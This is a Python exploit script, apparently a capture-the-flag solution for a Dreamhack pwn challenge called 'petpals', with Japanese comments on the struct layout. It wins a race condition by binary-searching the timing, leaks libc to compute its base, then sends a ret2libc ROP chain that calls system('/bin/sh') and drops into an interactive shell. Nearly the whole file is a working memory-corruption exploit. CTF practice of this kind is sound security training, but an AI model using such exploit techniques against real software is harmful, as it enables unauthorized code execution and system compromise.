#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn
import time
import threading

exe = ptr.ELF("./petpals_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")

# pwn.context.log_level = "debug"


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22467)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    def sla(io, delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(io, delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(io, data: bytes):
        io.sendline(data)
        return

    def s(io, data: bytes):
        io.send(data)
        return

    def r(io, size: int) -> bytes:
        return io.recv(size)

    def ru(io, delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl(io) -> bytes:
        return io.recvline()

    def create_or_update(io, animal_type: bytes, name: bytes, first_recv: bool = True):
        sla(io, b"> ", b"1")
        sla(io, b"type: ", animal_type)
        sla(io, b"name: ", name)
        return

    def create_or_update_unrecv(io, animal_type: bytes, name: bytes):
        sl(io, b"1")
        sl(io, animal_type)
        sl(io, name)
        return

    def walk_together(io):
        sla(io, b"> ", b"2")
        return

    def walk_together_unrecv(io):
        sl(io, b"2")

    def rename(io, name: bytes, line=True) -> bytes:
        sl(io, b"3")

        type_dump = ru(io, b" name: ")

        if line:
            sl(io, name)
        else:
            s(io, name)
        return type_dump

    def quit(io):
        sla(io, b"> ", b"4")
        return

    # animal(0x10) lizard hamster:
    # 0 0x00 ~ 0x08: animal_type_idx
    # 1 0x08 ~ 0x10: name
    # 2 0x10 ~ 0x18: name
    # 3 0x18 ~ 0x20: length (0x10) (uint64_t)
    # 4 0x20 ~ 0x28: unknown_byte (0x64)

    # animal(0x20) dog cat:
    # 0 0x00 ~ 0x08: animal_type_idx
    # 1 0x08 ~ 0x10: name
    # 2 0x10 ~ 0x18: name
    # 3 0x18 ~ 0x20: name
    # 4 0x20 ~ 0x28: name
    # 5 0x28 ~ 0x30: length (0x20) (uint64_t)
    # 6 0x30 ~ 0x38: unknown_byte (0xc8)

    # &animal: 0x00007fffffffea00

    # typeがlizardかhamsterなのに、データがdog catな状態にする

    # 1: dogを作り、nameを0xffff...で埋める
    # 2: walk_togetherをする
    #   2.1: walk_togetherしている間にlizardにupdateする (dogのnameのがcopyされる前にupdateが終わる必要がある)

    # animal(0x20) dog cat:
    # 0 0x00 ~ 0x04: animal_type_idx, 0x04 ~ 0x08: padding
    # 1 0x08 ~ 0x10: name
    # 2 0x10 ~ 0x18: name
    # 3 0x18 ~ 0x20: name
    # 4 0x20 ~ 0x28: name
    # 5 0x28 ~ 0x30: length (0x20) (uint32_t)
    # 6 0x30 ~ 0x38: unknown_byte (0xc8)

    def make_race_condition():
        min_timing = 0
        max_timing = 10

        while True:
            io = connect()

            timing = (max_timing + min_timing) / 2
            ptr.logger.info(f"trying... {timing}s")

            create_or_update(io, b"dog", b"A" * (8 * 2) + ptr.p64(0x70 + 1))
            walk_together(io)

            time.sleep(timing)
            create_or_update_unrecv(io, b"lizard", b"B" * 0xF)

            ru(io, b"satisfied!")
            rl(io)

            # input(">> ")
            type_dump = rename(io, b"C")
            type_dump = type_dump[len(type_dump) - 20 : len(type_dump) - 1]
            ptr.logger.info(f"type: {type_dump}")

            if b"dog" in type_dump:
                min_timing = timing
                print("dog")
                io.close()
                continue

            if b"lizard" in type_dump:
                max_timing = timing
                print("lizard")
                io.close()
                continue

            return (io, timing)

    (io, timing) = make_race_condition()

    rename(io, b"A" * (8 * 8), line=False)

    walk_together(io)
    ru(io, b"sent ")
    libc.base = ptr.u64(ru(io, b" for", drop=True).strip(b"AAAAA")) - 0x29D90
    # libc.base = ptr.u64(ru(io, b" for", drop=True)) - 0x29D90

    create_or_update_unrecv(io, b"dog", b"A" * (8 * 2) + ptr.p64(0x100 + 1))
    walk_together(io)
    time.sleep(timing)
    create_or_update_unrecv(io, b"lizard", b"B" * 0xF)

    ret = next(libc.gadget("ret;"))
    pop_rdi = next(libc.gadget("pop rdi; ret;"))
    system = unwrap(libc.symbol("system"))
    bin_sh = next(libc.find("/bin/sh"))

    payload = b""
    payload += b"A" * 0x40
    payload += ptr.p64(ret)
    payload += ptr.p64(pop_rdi)
    payload += ptr.p64(bin_sh)
    payload += ptr.p64(system)

    rename(
        io,
        payload
    )

    input(">> ")
    sl(io, b"4")

    io.interactive()

    # if offset == 0:
    #     create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8)
    # else:
    #     create_or_update(b"dog", b"A" * 0x10 + b"\xff" * 8, first_recv=False)
    # walk_together()
    # time.sleep(4.1 - offset * 0.01)
    # create_or_update(b"lizard", b"B" * 8)
    # dump = ru(b"is returned")
    # print(f"##########{str(4 - offset * 0.01)}##########")
    # print(dump)
    #
    # print(offset)
    # io.close()
    return


if __name__ == "__main__":
    main()
    # for i in range(1):
    # threads = []
    # for offset in range(100 * 2):  # 0.00 ~ 0.99 秒ずらして 100通り試す
    #     t = threading.Thread(target=main, args=(offset,))
    #     t.start()
    #     threads.append(t)
    #
    # for t in threads:
    #     t.join()
    #     time.sleep(0.5)

    print("hello")
